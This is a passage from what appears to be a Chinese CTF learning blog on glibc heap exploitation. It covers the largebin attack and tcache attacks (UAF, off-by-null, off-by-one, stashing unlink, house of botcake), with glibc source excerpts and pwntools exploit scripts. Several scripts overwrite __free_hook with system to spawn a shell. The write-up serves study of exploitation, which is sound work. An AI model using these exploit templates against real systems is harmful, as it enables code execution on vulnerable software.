class="number">19</span>     malloc(<span class="number">0x20</span>);</span><br><span class="line"><span class="number">20</span> </span><br><span class="line"><span class="number">21</span>     free(p1);</span><br><span class="line"><span class="number">22</span>     free(p2);</span><br><span class="line"><span class="number">23</span> </span><br><span class="line"><span class="number">24</span>     void* p4 = malloc(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">25</span> </span><br><span class="line"><span class="number">26</span>     free(p3);</span><br><span class="line"><span class="number">27</span> </span><br><span class="line"><span class="number">28</span>     p2[-<span class="number">1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line"><span class="number">29</span>     p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">30</span>     p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">31</span>     p2[<span class="number">1</span>] = (unsigned long)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line"><span class="number">32</span>     p2[<span class="number">3</span>] = (unsigned long)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"><span class="number">33</span> </span><br><span class="line"><span class="number">34</span>     malloc(<span class="number">0x90</span>);</span><br><span class="line"><span class="number">35</span> </span><br><span class="line"><span class="number">36</span>     fprintf(stderr, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (void *)stack_var1);</span><br><span class="line"><span class="number">37</span>     fprintf(stderr, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (void *)stack_var2);</span><br><span class="line"><span class="number">38</span> </span><br><span class="line"><span class="number">39</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">40</span> &#125;</span><br></pre></td></tr></table></figure>

<p>free(p1)</p>
<p>free(p2)</p>
<p><img src="/2025/11/18/Largebin-Attack/1756743661615-e7cc34ed-681d-4d50-ace6-7df8c4747143.png" alt="img"></p>
<p>malloc(0x90)</p>
<p>从堆块1中切割，遍历时将堆块1放入smalbin，堆块2largebin，切割堆块1，堆块1，进入unsortbin</p>
<p>free(3)</p>
<p><img src="/2025/11/18/Largebin-Attack/1756743802122-3d2f1ef0-8d70-41dd-a67e-506cb2bf9114.png" alt="img"></p>
<p>然后修改p2，size位改为0x3f1，bk_nextsize &#x3D; stack2-0x20 ,bk &#x3D; stack1-0x10</p>
<p><img src="/2025/11/18/Largebin-Attack/1756737905544-513ca872-0135-431d-b353-d18955e97de3.png" alt="img"></p>
<p> malloc(0x90)</p>
<p>还是从堆块1中切割，堆块1进入smallbin，堆块3进入largebin，切割堆块1，堆块1，进入unsortbin</p>
<p>在堆块3挂入largebin的时候P3_size &gt; P2_size 就会执行</p>
<p><img src="/2025/11/18/Largebin-Attack/1756744763693-dcb9f699-25fb-4558-98d7-03581d473931.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		P3-&gt;fd_nextsize = P2;  //P3的fd_nextsize要修改成P2的头指针</span><br><span class="line">		P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; //P3的bk_nextsize要修改成P2的bk_nextsize指向的地址</span><br><span class="line">		P2-&gt;bk_nextsize = P3;  //P2的bk_nextsize要修改成P3的头指针</span><br><span class="line">		P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; //P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针</span><br><span class="line">	&#125;</span><br><span class="line">bck = P2-&gt;bk; //bck等于P2的bk</span><br></pre></td></tr></table></figure>

<p><strong>执行之前：</strong>                                                                         <strong>执行之后：</strong></p>
<p><img src="/2025/11/18/Largebin-Attack/1756744322048-f5298ed1-af48-401e-a599-818b3ac0b68a.png" alt="img">                <img src="/2025/11/18/Largebin-Attack/1756750475119-9a291121-5aa9-4489-bab5-8d400a954a6d.png" alt="img">                    <strong>这个过程其实就是让p3加在fake_chunk2 与p2之间使得fake_chun2的fd_nextsize&#x3D;p2</strong></p>
<ul>
<li><code>P2-&gt;bk_nextsize-&gt;fd_nextsize = stack_var2_addr</code></li>
<li><code>P3-&gt;bk_nextsize = P2-&gt;bk_nextsize</code></li>
<li><code>P3-&gt;bk_nextsize-&gt;fd_nextsize = P3</code></li>
</ul>
<p>那么就可以导出结论：<code>stack_var2的值 = P3头指针</code>，所以stack_var2变量中的内容就被修改成了P3的头指针 </p>
<p>看图片中红色的字</p>
<p>还有fd与bk</p>
<p><strong>bck &#x3D; P2-&gt;bk; &#x2F;&#x2F;bck等于P2的bk</strong></p>
<p>值得注意的是bck是p2的bk指针也就是fake_chunk的头部，后面p2的bk指针变了，但是bck没变还是fake_chunk的头部</p>
<p><img src="/2025/11/18/Largebin-Attack/1756745035922-6d0dbf46-2619-4995-b849-217284d10400.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk; //P3的bk指针要等于P2的bk指针</span><br><span class="line">P3-&gt;fd = P2; //P3的fd指针要等于P2的头指针</span><br><span class="line">P2-&gt;bk = P3; //P2的bk指针要等于P3的头指针</span><br><span class="line">P2-&gt;bk(fake_chunk1)-&gt;fd = P3; //P2的bk指针指向的堆块的fd指针要等于P3的头指针</span><br></pre></td></tr></table></figure>

<p>​       <strong>执行之前：                                                                执行之后：</strong></p>
<p><img src="/2025/11/18/Largebin-Attack/1756749251906-3fbd6c92-f3cb-41c0-b759-bcc7a4e575e3.png" alt="img">                                           <img src="/2025/11/18/Largebin-Attack/1756749348637-e84a779d-7572-4cba-a53a-e78936caa8ff.png" alt="img">	</p>
<p><strong>这个过程其实就是让p3加在fake_chunk2与p2之间使得fake_chun1的fd&#x3D;p3</strong></p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><h2 id="2-30版本及之前"><a href="#2-30版本及之前" class="headerlink" title="2.30版本及之前"></a>2.30版本及之前</h2><p>在2.30以前，缺少对largebin attack的检查，所以我们可以大胆的进行伪造，在插入一块新的largebin时，会将当前堆块的bk-&gt;fd和bk_nextsize-&gt;fd_nextsize写成当前堆块的地址，如下图，所以如果根据下图把bk构造成targetaddr1-0x10，bk_nextsize构造成targetaddr1-0x20，即可在插入largebin时（插入的要大于P2）触发unlink进行同时改写两处地址为heapaddr（插入堆块的头部）</p>
<p><img src="/2025/11/18/Largebin-Attack/1756749574102-a71c326c-4a42-48dc-833d-8c681d71c7bd.png" alt="img"></p>
<h2 id="2-30之后"><a href="#2-30之后" class="headerlink" title="2.30之后"></a>2.30之后</h2><p>2.30之后会进行如下两个检查</p>
<p><img src="/2025/11/18/Largebin-Attack/1756749725843-2f584550-9cc8-4d36-ad91-619fa0a5cce2.png" alt="img"></p>
<p>这就导致在申请的堆块大于最小chunk时我们不能随意地修改bk和bk_nextsize了，为了绕过这个检查，我们要使得当前申请的堆块小于目前的最小chunk（即它是新的最小），还记得为什么吗？上文中红色的部分，因为如果它是最小它会直接被链入，没有这些乱七八糟的检查，但这也导致他只能任意写bk_nextsize指向的位置，所以在这种情况下，可以将bk_nextsize赋成targetaddr-0x20</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">assert (chunk_main_arena (bck-&gt;bk));//断言bck-&gt;bk属于main_arena</span><br><span class="line">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">       fwd = bck; //这里的fwd可以粗略的认为是large_bin归属的main_arena</span><br><span class="line">       bck = bck-&gt;bk; //bck成了main_arena的bk指针指向的堆块</span><br><span class="line">       victim-&gt;fd_nextsize = fwd-&gt;fd; //我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块</span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;//攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize</span><br><span class="line">       fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码与unsorted_bins、large_bins有关，这是<strong>从unsorted_bins里提取出来的堆块((unsigned long) (size))与large_bins里的最小堆块((unsigned long) chunksize_nomask (bck-&gt;bk))进行比较</strong>,如果unsorted出来的堆块更小，就执行如上操作。</p>
<p>所以我们先往largebin里面放一个堆块，然后unsortbin里面有个比largebin已有的小的堆块，然后申请一个比已有unsortbin打的堆块，unsortbin中的堆块就会进入largebin，完成往任意地址写堆块地址</p>
<h2 id="模板："><a href="#模板：" class="headerlink" title="模板："></a>模板：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)</span><br><span class="line">free(<span class="number">0</span>)      <span class="comment">#0进入unsortbin  </span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>) <span class="comment">#0进入largebin</span></span><br><span class="line">free(<span class="number">2</span>)      <span class="comment">#2进入unsortbin</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21b0e0</span> <span class="comment">#泄露libc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">addr2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#泄露堆块地址</span></span><br><span class="line">addr1 = addr2+<span class="number">0x890</span> <span class="comment">#2</span></span><br><span class="line">pie = addr2-<span class="number">0x5290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(listall-<span class="number">0x20</span>)) <span class="comment">#改bk_next</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)                       <span class="comment">#2进入largebin且比largebin中的最小的堆块小</span></span><br></pre></td></tr></table></figure>

<h2 id="例：how2heap-1"><a href="#例：how2heap-1" class="headerlink" title="例：how2heap"></a>例：how2heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;assert.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">  /*Disable IO buffering to prevent stream <span class="keyword">from</span> interfering <span class="keyword">with</span> heap*/</span><br><span class="line">  setvbuf(stdin,NULL,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout,NULL,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(stderr,NULL,_IONBF,<span class="number">0</span>);</span><br><span class="line">  size_t target = <span class="number">0</span>;</span><br><span class="line">  size_t *p1 = malloc(<span class="number">0x428</span>);</span><br><span class="line">  size_t *g1 = malloc(<span class="number">0x18</span>);</span><br><span class="line">  size_t *p2 = malloc(<span class="number">0x418</span>);</span><br><span class="line">  size_t *g2 = malloc(<span class="number">0x18</span>);</span><br><span class="line">  free(p1);</span><br><span class="line">  size_t *g3 = malloc(<span class="number">0x438</span>); <span class="comment">#p1进入largebin</span></span><br><span class="line">  free(p2);                   </span><br><span class="line">  p1[<span class="number">3</span>] = (size_t)((&amp;target)-<span class="number">4</span>);</span><br><span class="line">  size_t *g4 = malloc(<span class="number">0x438</span>); <span class="comment">#p2进入largebin，且p2是小于p1的</span></span><br><span class="line">  <span class="keyword">assert</span>((size_t)(p2-<span class="number">2</span>) == target);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/18/tcache-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="和方煜">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小小pwn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/18/tcache-attack/" class="post-title-link" itemprop="url">tcache attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-11-18 12:46:30 / 修改时间：12:51:44" itemprop="dateCreated datePublished" datetime="2025-11-18T12:46:30+08:00">2025-11-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <hr>
<h4 id="tcache介绍"><a href="#tcache介绍" class="headerlink" title="tcache介绍"></a>tcache介绍</h4><ul>
<li>1.每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中，当申请大于7个就会放入fastbins，但是tcache优先级高于fastbins，tcache先被申请出来</li>
<li>2.对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。</li>
<li>tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache bin中的fd指针是指向malloc返回的地址，也就是用户数据部分，而不是像fast bin单链表那样fd指针指向chunk头。</li>
<li><img src="/2025/11/18/tcache-attack/1746011774373-d82b2cf8-84c7-4838-b758-d8d33c0b311e.png" alt="img"></li>
</ul>
<h4 id="tcache绕过"><a href="#tcache绕过" class="headerlink" title="tcache绕过"></a>tcache绕过</h4><p>1.绕过tcache进行fastbin attack申请大小相同的七个堆块，然后在申请一个，free7个，free最后申请的那个就会进入fastbin</p>
<p>2.绕过tcache bin ，利用unsorted bin，申请大于0x400的堆块，要防止堆块和top chunk合并</p>
<p>3.使用calloc<br>calloc函数不会分配tcache bin中的堆块，因此如果题目中出现了calloc函数，我们可以想到利用该函数直接绕过tcache，从而获得其它bin上的chunk。</p>
<p>申请8个free8个使用calloc申请就会直接获取ast bin上的chunk块（正常是先会申请tcache上的）</p>
<h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>1.tcache机制情况下的chunk extend，相比较于fastbin，tcache机制的加入使得漏洞利用更简单，因此实现chunk extend也更轻松，不用正确标记next chunk的size,只需要修改当前chunk的size。我们free再malloc后就可以获得对应大小的chunk</p>
<p>2.glibc-2.27版本引入了tcache，但此时还没引入tcache的检测，所以基本就是想怎么申请都行,直接利用use aftr free，修改fd为__malloc&#x2F;free_hook</p>
<p>3.glibc-2.31版本引入了tcache长度保护，会<strong>检测bins上的个数是否和申请的匹配</strong>，不匹配的话没法申请出来。比如说tcache_bins上0x90的chunk个数为0，但是我们gdb里显示我们劫持的地址还没申请出来，这个时候如果malloc的话是无效的，没法申请出来。所以要是想劫持hook地址，我们就需要至少两个堆块被free进了tcache_bins里，修改头指针fd为hook即可</p>
<h2 id="1-tcachebin-uaf"><a href="#1-tcachebin-uaf" class="headerlink" title="1.tcachebin uaf"></a>1.tcachebin uaf</h2><p>1.glibc-2.27的tcachebin改fd指针申请堆块不会检查，所以可以随便改（也就是打malloc&#x2F;free不用找size位为0x7f的了），这使得打free_hook,更简单</p>
<p>2..glibc-2.31版本引入了tcache长度保护，会<strong>检测bins上的个数是否和申请的匹配</strong>，比如说tcache_bins上0x90的chunk个数为0，但是我们gdb里显示我们劫持的地址还没申请出来，这个时候如果malloc的话是无效的，没法申请出来。所以要是想劫持hook地址，我们就需要至少两个堆块被free进了tcache_bins里，修改最后被free的那个堆块的fd指针</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">6</span>,p64(__free_hook))</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">system = libc_base +libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure>

<p>先申请7个，在申请一个就会在unsortbin，利用这个泄露libc，修改最后一个tcachebin的fd，申请两次就把free_hook申请出来了</p>
<h2 id="2-tcachebin-off-by-null"><a href="#2-tcachebin-off-by-null" class="headerlink" title="2.tcachebin off by null"></a>2.tcachebin off by null</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x190</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xf0</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x88</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">bug()</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x88</span>)</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">edit(<span class="number">13</span>,p64(system))</span><br><span class="line">edit(<span class="number">12</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>



<p>具体就是绕过tcachebin，将堆块申请在unsortbin就行具体就不解释了，和正常的off by null一样</p>
<h2 id="3-tcachebin-off-by-one"><a href="#3-tcachebin-off-by-one" class="headerlink" title="3.tcachebin off by one"></a>3.tcachebin off by one</h2><p>让合并后的堆块大于0x400，进入unsortbin就可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">d(<span class="number">0x18</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xe1&#x27;</span>  </span><br><span class="line">edit(<span class="number">0</span>, payload) </span><br><span class="line">delete(<span class="number">1</span>)           </span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>)  </span><br><span class="line">show(<span class="number">2</span>）</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr))</span><br></pre></td></tr></table></figure>

<h2 id="4-tcache-stashing-unlink-attack"><a href="#4-tcache-stashing-unlink-attack" class="headerlink" title="4.tcache stashing unlink attack"></a>4.tcache stashing unlink attack</h2><p>知识点：</p>
<p>1.当系统需要分配内存，且 tcache bin 和 fastbin 中都找不到合适的堆块时，就会到 unsorted bin 上寻找。如果申请的内存堆块小于 unsorted bin 中某个堆块的大小，那么会将该内存块切割后返回给用户，剩下的部分仍然保存在 unsorted bin 上；如果申请的内存堆块大于 unsorted bin 上存放的堆块大小，那么会从 Top chunk 上重新分割，此时就会把 unsorted bin 上的堆块按照大小放回 small bin 和 large bin 中。</p>
<p>2.当从smallbin中申请出来一个堆块，smallbin剩余的堆块就会被挂进tcachebin，并且只会检查第一个被挂进tcachebin的堆块</p>
<p>利用前提：有calloc</p>
<p>首先申请9个堆块，先释放3-8，再将堆块1，释放，最后释放0，2</p>
<p><img src="/2025/11/18/tcache-attack/1748055988540-fbe5de08-ccea-43a6-b8c4-6f206468ba92.png" alt="img"></p>
<p>解释：这样目的是为了后面申请0xb0的堆块，tcache bin 和 fastbin 中都找不到合适的堆块，且unsortbins也不能合并（因为不相邻），这样最后会从top_chunk中新申请一个0xb0(data部分为0xa0)大小的堆块，并且将unsorted bin中的两个堆块，按照大小排列在small bin中：</p>
<p><img src="/2025/11/18/tcache-attack/1748056218305-4332b553-42a3-4d3d-b550-4ec3e756e2f5.png" alt="img"></p>
<p>然后在申请两个0xa0的堆块，将tcache bin空出来</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54275507/1748056740603-f6540543-9749-4cb6-9983-45e8976c7440.png" alt="img"></p>
<p><img src="/2025/11/18/tcache-attack/1748061756073-91c5c960-a602-4158-89c1-d11e0985cf99.png" alt="img"></p>
<p>将2的bk改为任意地址，然后用calloc申请堆块，堆块0就会被申请出来，堆块2，与伪造堆块2后面的堆块就会被放入tcache bin</p>
<p><img src="/2025/11/18/tcache-attack/1748058573064-310068c9-8dbb-4234-9b8c-35bda8739245.png" alt="img"></p>
<h2 id="5-高版本没有edit-tcachebin-attack"><a href="#5-高版本没有edit-tcachebin-attack" class="headerlink" title="5.高版本没有edit  tcachebin attack"></a><strong>5.高版本没有edit  tcachebin attack</strong></h2><p><strong>glibc2.29～glibc2.39</strong>，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的</p>
<p>当 free 掉一个堆块进入 tcache 时，假如堆块的 bk 位存放的 <code>key == tcache_key</code> ， 就会遍历<strong>这个大小</strong>的 Tcache ，假如发现同地址的堆块，则触发 Double Free 报错。</p>
<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
<p>之前只是检查链表的上一个，这次是检查全部的链表</p>
<p>从攻击者的角度来说，我们如果想继续利用 Tcache Double Free 的话，一般可以采取以下的方法：</p>
<ol>
<li>破坏掉被 free 的堆块中的 key，绕过检查（常用）</li>
<li>改变被 free 的堆块的大小，遍历时进入另一 idx 的 entries</li>
<li><strong>House of botcake</strong>（常用没有edit）</li>
</ol>
<p>1.free后用uaf改bk，然后就可以再次free</p>
<p>2没学</p>
<p>3.House of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。</p>
